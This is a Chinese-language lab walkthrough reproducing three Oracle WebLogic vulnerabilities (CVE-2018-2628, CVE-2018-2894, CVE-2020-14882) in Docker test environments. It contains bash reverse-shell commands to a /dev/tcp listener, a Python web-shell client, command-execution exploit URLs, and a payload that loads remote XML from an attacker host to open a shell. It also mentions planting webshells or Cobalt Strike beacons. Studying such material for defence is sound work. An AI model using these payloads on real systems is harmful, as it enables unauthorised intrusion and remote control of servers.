    /bin/bash
    -c
    bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
# CVE-2018-2628
WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)。Oracle WebLogic
Server的T3通讯协议的实现中存在反序列化漏洞。远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用）
机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行
同为WebLogic
T3引起的反序列化漏洞还有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2893、CVE-2016-0638
## 漏洞原理
在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java
Remote Method
protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI
registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。
## 漏洞复现
进入CVE-2018-2628的docker环境
这里先使用nmap扫描一下是否开启了WebLogic T3服务
    nmap -n -v -p 7001,7002 192.168.1.10 --script=weblogic-t3-info
这里使用K8Weblogic.exe直接写一个shell进去
然后使用以下py获取一个交互型shell
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    print r'''
    https://github.com/jas502n/CVE-2018-2628
    @author Jas502n
    '''
    import base64
    import urllib
    import requests
    from urllib import *
    def shell(url,cmd):
        all_url = url + "?tom=" + base64.b64encode(cmd)
        try:
            result = requests.get(all_url)
            if result.status_code == 200:
                print result.content
        except requests.ConnectionError,e:
            print e
    th = {"url":""}
    while True:
        if th.get("url") != "":
            input_cmd = raw_input("cmd >>: ")
            if input_cmd == "exit":
                exit()
            elif input_cmd == 'set':
                url = raw_input("set shell :")
                th['url'] = url
            elif input_cmd == 'show url':
                print th.get("url")
            else:
                shell(th.get("url"),input_cmd)
        else:
            url = raw_input("set shell :")
            th["url"] = url
url这个位置就填之前exe上传shell的位置即可，拿到交互shell之后可以echo写一个冰蝎马或者powershell上线cs都可
# CVE-2018-2894
WebLogic 未授权访问漏洞(CVE-2018-2894)，存在两个未授权的页面，可以上传任意文件，但是这两个页面只在开发环境下存在
## 漏洞原理
在ws-testpage-impl.jar/com.oracle.webservices.testclient.ws.res.WebserviceResource
类中存在importWsTestConfig方法
跟进
RSdataHelper的convertFormDataMultiPart方法，接下来调用convertFormDataMultiPart方法，文件直接由字段
文件名拼接而成，没有任何限制。
ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:164
## 漏洞复现
进入CVE-2018-2894的docker环境
这里我们首先打开docker的开发环境。这里因为不是弱口令的docker，所以这里我们执行命令看一下进入后台的密码
    docker-compose logs | grep password
使用得到的密码登入后台
点击高级选项
勾选启用web服务测试页
保存即可进入开发环境
开发环境下的测试页有两个，分别为`config.do`和`begin.do`
首先进入`config.do`文件进行设置，将目录设置为`ws_utc`应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。
    /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
点击添加后上传一个jsp
提交之后点击F12审查元素得到jsp上传后的时间戳
构造得到
这里我们在对`begin.do`未授权访问进行利用。访问
点击提交，这里辉显示一个error不用管它，F12进入网络，然后筛选POST方法，得到一个jsp的路径
构造得到
# CVE-2020-14882
## 漏洞原理
这个洞的利用过程十分精妙，说实话有点没太跟明白，这里就不详细写了，大致就是通过访问`console.portal`路径并且触发`handle`执行。有兴趣的小伙伴请移步：
[CVE-2020-14882：Weblogic Console
权限绕过深入解析](https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4
"CVE-2020-14882：Weblogic Console 权限绕过深入解析")
## 漏洞复现
首先进入CVE-2020-14882的docker环境
访问控制台如图所示
这里直接可以构造
[http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29](http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29)
访问即可进入后台，达到未授权访问的效果
但是这里没有部署安装的按钮，也就是说不能像常规进入后台后写shell进去，这里就需要用到远程加载XML文件拿shell
首先测试以下漏洞代码执行是否成功，在/tmp/下创建一个test文件夹
访问[http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch](http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession\(%22java.lang.Runtime.getRuntime\(\).exec\(%27touch)
/tmp/test%27);%22);
得到如下界面，这里看起来没有利用成功
我们进入docker查看发现文件夹已经创建成功了
    docker ps
    sudodocker exec -it b6a1b6c3e4d1 /bin/bash
这里创建一个xml文件，还是使用bash命令得到反弹shell
    # reverse-bash.xml
    ​
    /bin/bash
    -c
    & /dev/tcp/192.168.1.2/5555 0>&1]]>
nc开启监听端口，访问
[http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.1.2:8000/test.xml](http://192.168.1.10:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext\()")
即可得到反弹shell
# 总结
weblogic的漏洞其实有很多，这里只是挑了一些比较常见的漏洞进行漏洞分析和复现，其实也有批量检测漏洞的软件，这里为了加深印象还是手动复现了一遍，这里漏洞分析这一块当然也是跟着大佬们的思路跟下去，这里对前辈们表示衷心的感谢，不足之处欢迎指出。
欢迎关注公众号 **红队蓝军**